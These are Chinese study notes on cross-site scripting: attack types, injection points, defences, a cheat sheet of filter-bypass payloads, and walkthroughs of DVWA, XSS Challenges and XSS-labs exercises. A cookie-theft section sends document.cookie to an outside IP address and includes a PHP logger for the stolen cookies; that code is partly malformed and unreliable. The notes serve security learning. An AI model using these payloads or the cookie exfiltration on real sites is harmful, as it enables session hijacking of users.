# XSS攻击

## XSS概述

**跨站脚本攻击（XSS）**：是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。



## XSS分类

- 反射型（非持久型跨站）：用户访问服务器-跨站链接-返回跨站代码
- 存储型（持久型跨站）：最直接的危害类型，跨站代码存储在服务器（数据库）
- DOM跨站型：它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行



### 反射型XSS

**反射型XSS是通过提交内容，然后不经过数据库，直接反射回显在页面上**

攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），**一般容易出现在搜索页面**



环境搭建

```php
<?php
    echo $_GET["input"] . "<br>";
?>
```



URL地址输入，进行测试，发现成功弹窗

```
?input==<script>alert(/XSS/)</script>
```



### 存储型XSS

**存储型XSS则需要先把利用代码保存在比如数据库或文件中**，当web程序读取利用代码时再输出在页面上执行利用代码。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。**常见在留言板中**

**XSS注入成功后，每次访问该页面都会将触发XSS**

- 插入留言 ==> 内容储存在数据库中
- 查看留言 ==> 内容从数据库提取出来
- 内容在页面显示



### DOM型XSS

- 通过**修改页面的DOM节点**形成的XSS，称之为**DOM Based XSS**。从效果来说，也是反射型。

- 反射型或存储型是**服务端将提交的内容反馈到了HTML源码内**，导致触发XSS。也就是说返回到HTML源码中可以看到触发XSS的代码。

- DOM型XSS只与**客户端上的 JavaScript 交互**，也就是说提交的恶意代码，被放到了js 中执行，然后显示出来。

- 实际上这种类型的XSS不是按照是否保存在服务端来划分的，从效果上来说它也是一种反射型XSS但是因为它的形成比较特别，发现它的安全专家专门提出了这种类型的XSS



## XSS输出点

- HTML中输出：

  ```html
  <div class=test>
  <script>alert(/2333/)</script>		//alert中可以写"2"代替/2/
  </div>
  ```

- 事件中输出：

  ```html
  <div class=test>
  <img src=1 onerror=alert(document.domain);>
  </div>
  ```

- 属性中输出：

  ```html
  <div class=test>
  <input name="content" value="onmouseover=alert(/2333/)/>"
  </div>
  ```
  
- CSS中输出：

  ```html
  <div class=test style="backgroud-image:url('javascript:alert(/2333/)')">
  </div>
  ```
```
  
- script标签中输出：

  ```html
  <script>
  vas a = "123"; alert(/2333/);";
  </script>
```

- 地址栏中输出：

  ```html
  <a href="javascript:alert(/2333/);">点击查看链接</a>
  
  <a href="data:text/html;base64,XXXXXXXXXX">XXXXX</a>
  ```

  

## XSS利用

### Cooike盗取









## XSS防御

- 代码层
  - Httponly
  - Htmlencode（转义）
  - 输入过滤，输出编码
- 架构层
  - WAF
  - IDS
- 业务层
  - 控制客户端输入的规则
  - 控制长度
  - 白名单





# 常用XSS构造

[XSS过滤绕过速查表](https://www.freebuf.com/articles/web/153055.html)

[XSS Challenges题目](https://www.cnblogs.com/ls-pankong/p/9510799.html)

直接构造：

```
xss=<script>alert(/2333/)</script>
```

**通过点击（事件）激活：**

```
'onclick='alert(/2333/);
'onclick=alert(/2333/)//
"onclick=alert(document.domain); id="a

'onmouseover=alert(/2333/)//
```

URL型用，**JavaScript伪类：javascript:**，的使用

```
javascript:alert(/2333/);
```

**伪造闭合：**

```
"><script>alert(/2333/)</script>

"><a onclick=alert(/2333/);></a>
```

**img标签构造：**

```
<img src=1 onerror=alert(/2333/)>
```

**iframe标签构造**：

```
<iframe onload=alert(/2333/)>
```

**a标签构造+URL截断（&#09）：**

```
"><a href="javascr&#09;ipt:alert(document.domain);">xxxxx</a>
```

**隐藏input，找到\<input\>标签中的name：**

```
?name="type="text" onmouseover="alert(/2333/) 
```

**IE浏览器特性：**

```
``onmouseover=alert(document.domain);
```



# XSS cookie盗取

构造存储型 xss ，内容为传参，并指向自己的服务器：

```html
<script>alert(/var url="39.99.232.62/eydm.php?msg="+zyc+document.cookie;Window.open(url,"_blank")/)</script>
```

服务器端进行接收数据，接收传参：

```php
<?php
$content = $_REQUEST["msg"];
$time = data(format:'Y-m-d H:i:s', time());
$file = "xss.txt";
$fp = fopen($file, mode:"a+");
fwrite($fp, string:$time . "|" . $content . "\r\n");
fclose($fp)
?>
```



# XSS例题

## 7道例题

### pass-1

#### 考点：理解XSS的原理

```php+HTML
<!DOCTYPE html>
<html>
<head>
    <title>反射型XSS-html</title>
    <meta charset="utf-8" />
</head>
<body>
    <form method="post" action="">
        <input type="input" name="xss" value="" />  <input type="submit" name="submit" value="xss" />
    </form>
    <?php
        echo isset($_POST['xss']) ? $_POST['xss'] : '';
        highlight_file(__FILE__);
     ?>
</body>
</html>
```

#### 思路：

由于没有过滤，可以直接注入XSS

**payload：**

```
<script>alert(/xss/)</script>
```



### pass-2

#### 考点：javascript:伪类

#### 思路：

提交后，出现链接，于是用javascript:

**payload：**

```
javascript:alert(/xss/);
```



### pass-3

#### 考点：XSS存储型（留言板）

#### 思路：

留言板，存在XSS注入点

**payload：**

```
<script>alert(/xss/)</script>
```



### pass-4

#### 考点：构造链接

```php+HTML
<input type="button" onclick="location='javascript:alert(/2333/);'" value="点击跳转">
```

#### 思路：

传入一个链接，构造一个点击事件

**payload：**

```
javascript:alert(/xss/);
```



### pass-5

#### 考点：构造闭合，再注入

```php+HTML
<input type="input" name="xss" value="">
```

#### 思路：

将value值闭合，再注入payload

**payload：**

```
"><script>alert(/xss/)</script>
```



### pass-6

#### 考点：构造闭合，再注入

```php+HTML
<input type="input" name="xss" value="" style="width: 200px" id="text">
```

#### 思路：

将value值闭合，再注入payload

```php+HTML
<input type="input" name="xss" value="" style="width: ">
<script>alert(/2333/)</script>
px"  id="text" /> 
```

**payload：**

```
"><script>alert(/xss/)</script>
```



### pass-7

#### 考点：构造\<script\>标签闭合，再注入

```jsp
<script>
	document.getElementById('text').style.width ="200px";
</script>
```

#### 思路：

将\<script\>标签闭合，再注入，再注入payload

```php+HTML
<script>
	document.getElementById('text').style.width =""</script>
<script>alert(/2333/)</script>
```

**payload：**

```
"</script><script>alert(/xss/)</script>
```



## [DVWA] XSS 靶场

### [DVWA]（DOM）

#### Low级别

##### 考点：URL注入XSS

##### 思路：直接在URL中注入XSS

**payload：**

```
?default=<script>alert(/xss/)</script>
```



#### Medium级别

##### 考点：URL截断（#、_、等特殊字符截断，服务器将不接收后续数据）

##### 思路：URL截断注入XSS

**payload：**

```
?#default=<script>alert(/xss/)</script>
```



#### High级别

##### 考点：URL截断（#、_、等特殊字符截断，服务器将不接收后续数据）

##### 思路：URL截断注入XSS

**payload：**

```
?#default=<script>alert(/xss/)</script>
```



### [DVWA]（Reflected）反射型

#### Low级别

##### 考点：简单的XSS注入

##### 思路：直接注入XSS

**payload：**

```
<script>alert(/xss/)</script>
```



#### Medium级别

##### 考点：双写绕过\<script\> 或 大小写绕过

##### 思路：双写绕过\<script\>被BAN的\<script\>

**payload：**

```
<sc<script>ript>alert(/xss/)</script>		//双写
<Script>alert(/xss/)</script>		//大小写
```



#### High级别

##### 考点：绕过正则表达式

无法使用\<script\>标签注入XSS代码，因此可以通过用：\<img\>\<iframe\>\<a\>等标签注入

```
preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'
```

##### 思路：绕过后，直接注入XSS

**payload：**

```
<img src=1 onerror=alert(/xss/)>
```



### [DVWA]（Stored）存储型

#### Low级别

##### 考点：修改注入长度，或者bp改包

##### 思路：突破长度限制，直接注入XSS

**payload：**

```
<script>alert(/xss/)</script>
```



#### Medium级别

##### 考点：双写绕过\<script\> 或 大小写绕过

##### 思路：双写绕过\<script\>被BAN的\<script\>

**payload：**

```
<sc<script>ript>alert(/xss/)</script>		//双写
<Script>alert(/xss/)</script>		//大小写
```



#### High级别

##### 考点：绕过正则表达式

##### 思路：绕过，直接注入XSS

**payload：**

```
<img src=1 onerror=alert(/xss/)>
```



## XSS Challenges

### Stage #1

#### 考点：直接注入

#### 思考：

**payload：**

```
<script>alert(/xss/)</script>
```



### Stage #2

#### 考点：双引号闭合

#### 思考：

**payload：**

```
"><script>alert(document.domain);</script>
```



### Stage #3

#### 考点：寻找注入点

#### 思考：

实验发现文本框不能正常注入，所以选择国家的框进行注入XSS

**payload：**

```
将Japan改为：<script>alert(document.domain);</script>	//文本框随便输入即可
```



### Stage #4

#### 考点：找到隐藏点

#### 思考：

查看源码发现\<input\>标签有一个type为“hidden”，修改为text，再在这个输入框注入

**payload：**

```
"><script>alert(document.domain);</script>
```



### Stage #5

#### 考点：长度限制

#### 思考：

修改最大输入长度限制

**payload：**

```
"><script>alert(document.domain);</script>
```



### Stage #6

#### 考点：构造事件

#### 思考：

构造事件处理程序属性

**payload：**

```
" onmousemove="alert(document.domain)
" onmouseover=alert(document.domain) name="1
" onclick=alert(document.domain) id="a
```



### Stage #7

#### 考点：绕过<> ，构造事件

#### 思考：

于第6题类似，构建payload

**payload：**

```
" onclick=alert(document.domain)
```



### Stage #8

#### 考点：URL链接构造

#### 思考：

发现会生成一个链接，于是用javascript:伪协议，再点击生成的链接

**payload：**

```
javascript:alert(document.domain)
```



### Stage #9

#### 考点：UTF-7编码

#### 思考：

这一关是利用UTF-7编码的，需要环境是IE 7

**payload：**

```
" onmouseover=alert(document.domain)>
+/v8 +ACI- onmouseover=alert(d+AG8AYw-u+AG0-en+AHQALg-d+AG8AbQBh-in)+AD4-
```



### Stage #10

#### 考点：双写绕过

#### 思考：

domain被过滤了，使用双写绕过

**payload：**

```
"><script>alert(document.domdomainain)</script>
```



### Stage #11

#### 考点：&#09，不可见字符的截断

#### 思考：

题目将script；on[a-z]，style都过滤了，于是采用截断

**payload：**

```
"><img src=1 onerr&#09;or=alert(document.domain);>

"><iframe src=javascr&#09;ipt:alert(document.domain);>	//不直接进入下一题
```



## XSS-labs

### level-1

#### 考点：URL直接注入

#### 思考：

直接注入xss

**payload：**

```
<script>alert(/xss/)</script>
```



### level-2

#### 考点：构造闭合，构造事件

#### 思考：

有多种方法：可以构造闭合\<script\>标签，构造事件

```
<input name="keyword" value="" onmouseover="alert(1)">">"

<input name="keyword" value="" onclick="alert(1)<br">">
```

**payload：**

```
"><script>alert(/2333/)</script>

" onmouseover=alert(/2333/)>		//需要鼠标划过输入框
" onclick=alert(/2333/)<br>		//需要鼠标点击输入框
```



### level-3

#### 考点：< 被转义了，单引号闭合

#### 思考：

闭合<"">构造script弹窗方法不适用，并且这里需要用单引号闭合，构造事件

**payload：**

```
' onmouseover=alert(/2333/)//	//需要鼠标划过输入框
' onclick=alert(/2333/)//		//需要鼠标点击输入框
```



### level-4

#### 考点：< 被转义了，双引号闭合

#### 思考：

类似于level-3，但这里需要双引号闭合，构造事件

**payload：**

```
" onmouseover=alert(/2333/)//	//需要鼠标划过输入框
" onclick=alert(/2333/)//		//需要鼠标点击输入框
```



### level-5

#### 考点：javascript:伪协议

#### 思考：

没有过滤尖括号<>，所以这里使用**javascript:伪协议**来构造

**payload：**

```
"><a href=javascript:alert(/2333/)>		//点击即可
"><a href="javascript:alert(/2333/)">xxxxx</a>		//点击即可

"><iframe src=javascript:alert(/2333/)>		//可以使用，但是无法继续
```



### level-6

#### 考点：闭合，大小写绕过

#### 思考：

script、on、src、data、href 等字符会被替换，但大小写没有约束

**payload：**

```
"> <Script>alert(/2333/)</script> 

"> <img Src=1 OnError=alert(/2333/)>

"><a HrEf="javascript:alert(/2333/)">xxxxx</a>

" Onmouseover=alert(/2333/)//	//需要鼠标划过输入框
" Onclick=alert(/2333/)//		//需要鼠标点击输入框
```



### level-7

#### 考点：闭合，双写绕过

#### 思考：

禁用大小写，script，on，src ，data ，href 都直接转换成空，但是删除一次

**payload：**

```
"><scrscriptipt>alert(/2333/)</scrscriptipt>

"><a hrhrefef=javascriscriptpt:alert(/2333/)>xxxxx</a>
```



### level-8

#### 考点：考虑URL编码、截断

#### 思考：

关键字被替换，**" 还被编码，但是尖括号<> ，单引号 ’ ,% ，# ，& 符号没有被过滤，输出点在a标签内，href属性中**

**payload：**

```
javasc&#x72;ipt:alert(/2333/)	//使用&#x72来代替r 

javascr&#09;ipt:alert(/2333/)	//使用&#09进行截断
```



### level-9

#### 考点：校验链接内容

#### 思考：

要求输入链接，发现会校验内容中是否有**http://**，可以利用注释将**http://**内容去掉

**payload：**

```
javascrip&#x74;:alert(/2333/)//http://xxx.com	//使用&#x74来代替t

javascr&#09;ipt:alert(/2333/)//http://xxx.com	//使用&#09进行截断
```



### level-10

#### 考点：找到隐藏参数

#### 思考：

查看页面源代码，发现有三个参数被隐藏了，（type=“hidden”）

于是传参进入，**规定type为text**显示出来，再注入XSS

```php+HTML
<input name="t_link" value="" type="hidden">
<input name="t_history" value="" type="hidden">
<input name="t_sort" value="" type="hidden">
```

**payload：**

```
?t_sort="type="text" onclick="alert(/2333/)		//url中
?t_sort="type="text" onmouseover="alert(/2333/)
```



### level-11

#### 考点：http头部的XSS注入

#### 思考：

bp抓包，增加新字段，构造http头部Referer

**payload：**

```
Referer: " onmouseover=alert(/2333/) type="text"

Referer: " onclick="alert(/2333/) type="text"
//注意添加位置，不要放在最后就行
```



### level-12

#### 考点：http头部的XSS注入（User-Agent字段）

#### 思考：

与11题类似，注入点更换为User-Agent:

**payload：**

```
User-Agent: " onmouseover=alert(/2333/) type="text"

User-Agent: " onclick="alert(/2333/) type="text
```



### level-13

#### 考点：http头部的XSS注入（Cookie字段）

**payload：**

与11题类似，注入点更换为Cookie:

```
Cookie: user= " onmouseover=alert(/2333/) type="text"

Cookie: user= " onclick="alert(/2333/) type="text
```



### level-14

#### 考点：图片exif 藏有XSS payload

[EXIF Viewer XSS漏洞](https://www.hackersb.cn/hacker/140.html)



### level-15

#### 考点：angular js

ng-include有包含文件的意思，也就相当于PHP里面的include，因此可以包含第一关的页面

#### 思考：

**payload：**

```
?src='level1.php?name=<img src=x onerror=alert(/2333/)>'

?src='http://127.0.0.1/XSS-Labs-master/level1.php?name=<img src=x onerror=alert(1)>'
```



### level-16

#### 考点：绕过空格

#### 思考：

这一关过滤了空格，可以选择用其他符号来绕过比如：%0a%0d，%0A，%0a

**payload：**

```
?keyword=<img%0a%0dsrc=x%0a%0donerror=alert(/2333/)>
```



### level-17

#### 考点：embed标签

- arg01和arg02提交的变量为注入点

- embed标签可以引入swf文件，在参数位置构造`onmouseover=alert(1)`。要注意火狐不支持swf，改成ie浏览器就可以了

#### 思考：

**payload：**

```
 onmouseover=alert(/2333/) 		//注意：onmouseover前面有一个空格
```



### level-18

#### 考点：embed标签

#### 思考：

与17题一样，arg01和arg02提交的变量为注入点

**payload：**

```
 onmouseover=alert(/2333/) 		//注意：onmouseover前面有一个空格
```



